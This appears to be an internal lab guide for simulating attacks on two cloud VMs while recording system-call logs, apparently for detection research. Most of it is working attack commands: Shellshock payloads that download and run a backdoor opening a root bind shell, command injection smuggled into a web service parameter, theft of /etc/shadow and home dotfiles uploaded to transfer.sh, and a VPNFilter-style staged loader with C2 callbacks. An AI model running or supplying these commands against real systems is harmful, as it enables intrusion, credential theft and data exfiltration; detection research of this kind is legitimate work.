# Peng attack guide

## Access guide

I prepared two VMs for the attack simulations. In order to access those machines, please share your *public key* with me. After registering public key, you can access virtual machines -- *vm0*, *vm1* using the following commands.

Both machines run *Ubuntu 18.04* and *sysdig* package is installed.

* Accessing *vm0*

```bash
ssh ubuntu@ec2-107-23-72-63.compute-1.amazonaws.com
```

Updated:

```bash
ssh ubuntu@vm0.sbrainconnect.com
```

* Accessing *vm1*

```bash
ssh ubuntu@ec2-34-231-225-199.compute-1.amazonaws.com
```

Updated:

```bash
ssh ubuntu@vm1.sbrainconnect.com
```

## Prerequisites

Install sysdig

```bash
curl -s https://s3.amazonaws.com/download.draios.com/stable/install-sysdig | sudo bash
```

Command for sysdig logging

```bash
sudo sysdig -p "%evt.num %evt.rawtime.s.%evt.rawtime.ns %evt.cpu %proc.name (%proc.pid) %evt.dir %evt.type cwd=%proc.cwd %evt.args latency=%evt.latency" evt.type!=switch and fd.type!=pipe​ or evt.type=execve​ > log.txt
```

Download log file

```bash
scp ubuntu@ec2-107-23-72-63.compute-1.amazonaws.com:/home/ubuntu/log.txt log_vm0.txt
scp ubuntu@ec2-34-231-225-199.compute-1.amazonaws.com:/home/ubuntu/log.txt log_vm1.txt
```

## 1. Shellshock penetration to open network backoor

All following commands are executed from *vm1*. Sysdig logging is enabled on both *vm0* and *vm1*.

1. Testing shellshock vulnerability from *vm1* to *vm0*. Issue the following command from *vm1*.


	```bash
	curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://vm0:8080/cgi-bin/env.cgi
	```
  
  * You should see the content of */etc/passwd* file for *vm0*.

2. Download *backdoor (bdoor)* program using Shellshock.

	```bash
	curl -H "user-agent: () { :; }; echo; echo; curl bdoor0.sbrainconnect.com/bdoor -o /tmp/bdoor" http://vm0:8080/cgi-bin/env.cgi
	```

3. Change permission

	```bash
	curl -H "user-agent: () { :; }; echo; echo; chmod 777 /tmp/bdoor" http://vm0:8080/cgi-bin/env.cgi
	```
4. Open backdoor port (44444). Note that the `curl` command doesn't return since it is running `bdoor`

	```bash
	curl -H "user-agent: () { :; }; echo; echo; /tmp/bdoor -l -p 44444 -e /bin/bash" http://vm0:8080/cgi-bin/env.cgi
	```

5. Open a different terminal on *vm1*. Make connection to *vm0* using the backdoor channel.

	```bash
	nc vm0 44444
	```

From the session, you can run arbitrary command as follows.

  ```bash
  ls
  env.cgi
  ping.cgi
  ping2.cgi
  ls -trl
  pwd
  /usr/local/thttpd/www/cgi-bin
  id
  uid=0(root) gid=0(root) groups=0(root)
  ```  

6. To re-run the attack, please delete the `/tmp/bdoor` on *vm0* first


7. If after `nc` the shell session does not respond, on *vm0* run:

  ```bash
  sudo netstat -anp|grep LIST
  sudo killall -9 bdoor  
  ```


### Extended Attack 1: Encryption / Decryption with GnuPG

Run the following commands from *vm1* (the command will be executed from *vm0*), after the initial (Shellshock) penetration.

1. Download images Cloud service (Dropbox)

  ```bash
  wget https://www.dropbox.com/s/g4kwxc8708l1gkb/IMG_4413.JPG?dl=0 -O /tmp/update.jpg
  ```

2. Export payload location

  ```bash
  IP=$(vpnfilter-stage1-exif.py /tmp/update.jpg)
  FILE=$(sum /tmp/update.jpg |cut -d ' ' -f1)
  ```

3. Download encrypted payload

  ```bash
  curl http://${IP}/$FILE -o /tmp/john.gpg
  ```

4. Decrypt password cracker (John-the-Ripper)

  ```bash
  KEY=$(md5sum /tmp/update.jpg |cut -d ' ' -f1)
  echo $KEY
  gpg --batch --yes --passphrase $KEY --output john.tbz2 --decrypt /tmp/john.gpg
  ```

5. Unzip and run the program

  ```bash
  tar xvjf john.tbz2
  cd john/
  ./john /etc/password.txt
  ./john --show /etc/password.txt
  ./john --show /etc/password.txt > password_crack.txt
  ```

6. To re-run the attack, do some clean-up on *vm0*

  ```bash
  sudo rm /tmp/update.jpg
  sudo rm /tmp/john.gpg
  sudo rm /tmp/bdoor
  cd /usr/local/thttpd/www/cgi-bin
  sudo rm -rf john john.tbz2
  ```

### Extended Attack 2: Data leakage

Run the following commands from VM0, after the initial (Shellshock) penetration.

Pre-requisite: Execute the following commands from *vm1* (the remote terminal for *vm0*): 

```bash
HOME="/home/ubuntu"
KEY="b007"
```


1. Gathering the sensitive files

  ```bash
  tar cvf /tmp/upload.tar $HOME/.* /etc/passwd /etc/shadow
  bzip2 /tmp/upload.tar
  ```

2. Encrypt the file

  ```bash
  gpg --batch --yes --passphrase $KEY --output /tmp/upload --symmetric /tmp/upload.tar.bz2
  ```

3. Data leakage to `transfer.sh`

  ```bash
  curl --upload-file /tmp/upload https://transfer.sh/upload 
  ```
  
4. To re-run the attack, do some clean-up on *vm0*

	```bash
	sudo rm -rf /tmp/upload.tar /tmp/upload.tar.bz2 /tmp/upload
	```


## 2. Command-line injection with input sanitization failures

### Preparation stage

* In order to launch the attack, remote controller service should be running
  from `vm0`.

  * Check whether port `8000` open from `vm0` 
  
  ```bash
	netstat -alntu | grep 8000
  ```
  
  If so, the service is already running, therefore you don't have to run the service again.

  * Otherwise, you can follow the following steps to run the service.
  
	    1. Remote login (can use VNC Viewer) to the GUI desktop (ec2-107-23-72-63.compute-1.amazonaws.com:3389).
	      * Login credential: `ubuntu/A*****5`
	    2. Open two *Terminals* and run the following commands.
	      
	      * Command 1
	        ```bash
	        python3 /opt/NECLA/SBrainDemo/kodi_dbus.py
	        ```
	      
	      * Command 2
	        ```bash
	        python /opt/NECLA/SBrainDemo/kodi_web.py
	        ```
	    3. Run `kodi` from Remote Desktop

### Attack stage (all-in-one-script)

* From `vm1` run, 

  ```bash
  python ~/bin/attack.py
  ```

#### Manual attack (didn't try this)

* If the above attack steps doesn't work, you can try the following.

* Playing Youtube clip (Normal behavior). Confirming the set-up is correct and
  remote command runs.
* Run the following commands from `vm1`.
  ```bash
  curl -X POST -H "Content-Type: application/json" -d 'YouTubeAddr=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3Dx4TDulEu_jI%26start_radio%3D1%26list%3DRDMMx4TDulEu_jI' http://vm0:8000
  ```

* Playing Youtube clip with command line injection (Abnormal behavior)
  * Downloading backdoor program

    ```bash
    curl -X POST -H "Content-Type: application/json" -d 'YouTubeAddr=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3Dx4TDulEu_jI%26start_radio%3D1%26list%3DRDMMx4TDulEu_jI%3B%2Fusr%2Fbin%2Fcurl%20http%3A%2F%2Fvm1%3A8081%2Fbdoor%20-o%20%2Ftmp%2Fbdoor' http://vm0:8000
    ```

  * The above command injects the following command.
    ```bash
    /usr/bin/curl http://vm1:8081/bdoor -o /tmp/bdoor
    ```

  * Change permission of backdoor program
    ```bash
    curl -X POST -H "Content-Type: application/json" -d 'YouTubeAddr=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3Dx4TDulEu_jI%26start_radio%3D1%26list%3DRDMMx4TDulEu_jI%3Bchmod%20777%20%2Ftmp%2Fbdoor' http://vm0:8000
    ```

  * The above command injects the following command.

    ```bash
    chmod 777 /tmp/bdoor
    ```

  * Run the backdoor program and open a port (44444) to outside.

    ```bash
    curl -X POST -H "Content-Type: application/json" -d 'YouTubeAddr=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3Dx4TDulEu_jI%26start_radio%3D1%26list%3DRDMMx4TDulEu_jI%3B%2Ftmp%2Fbdoor%20-l%20-p%2044444%20-e%20%2Fbin%2Fbash' http://vm0:8000
    ```

  * The above command injects the following command.

    ```bash
    /tmp/bdoor -l -p 44444 -e /bin/bash
    ```

### Post exploitation behaviors

* Run the following command from `vm1` to connect to `vm0`.

  ```bash
  nc vm0 44444
  ```

* Invocation of malicious commands:
	* File scanning: search the "password" string in all files in /ubuntu/home

	 	```bash
	 	cd ~
	  	grep -R passwd * > /tmp/password_in_files.txt
	  	```
	  
	  This will incur large amount of file read activities, unseen from previous executions.

* To re-run the attack, do some clean-up on *vm0*

	```bash
	sudo rm /tmp/bdoor
	sudo rm /tmp/password_in_files.txt
	```



## 3. VPNFilter attack

### Scenario
An IoT device is infected with VPNFilter.


### Run the attack

From *vm1* (which is C2 host from Internet), run the following

```bash
ubuntu@attack-vm1:~/attack_vpnfilter$ ./run_attack_server.sh 172.31.77.48
    1 image files updated
```

From *vm0* (which is victim host), run

```bash
ubuntu@attack-vm0:~/attack_vpnfilter$ ./run_attack_iot.sh 172.31.77.48
Start download at http://172.31.77.48/update.php
ubuntu@attack-vm0:~/attack_vpnfilter$ Finish download at http://172.31.77.48/update.php
read tags
172.31.77.48
Start download at http://172.31.77.48/update/test
Finish download at http://172.31.77.48/update/test
```


### Detailed attack stages

The vpnfilter stage1 malware will access a public image repo to get an image. In the exif metadata of the image, it contains the IP address for the stage2 server. It downloads the vpnfilter stage2 from the stage2 server, and run it.  In order to still running even after a reboot, the stage1 write the crontab to check if it is running every 5 mintes

####  Stage 1

1. Context the public website and download image file to */tmp/img*
2. Extract X2 address from the downloaded image refering to EXIF meta data.
3. edit `/etc/config/crontab` and add an entry to schedule itself.
4. Write certificate files under `/var/run/{client_ca.crt,client.crt,client.key}`
5. Making secure (https) connection to IP (gained from Step 2) using the certificates.
6. Download the plug-in (stage 2) binary file from from c2 host and write down to `/var/vpnfilter`
7. Run the `/var/vpnfilter` binary

#### Stage 2 (`/var/vpnfilter`)

1. Fork the child process
2. After execution, delete the file itself
3. Periodically connects to IP address ("217.12.202.40")


 
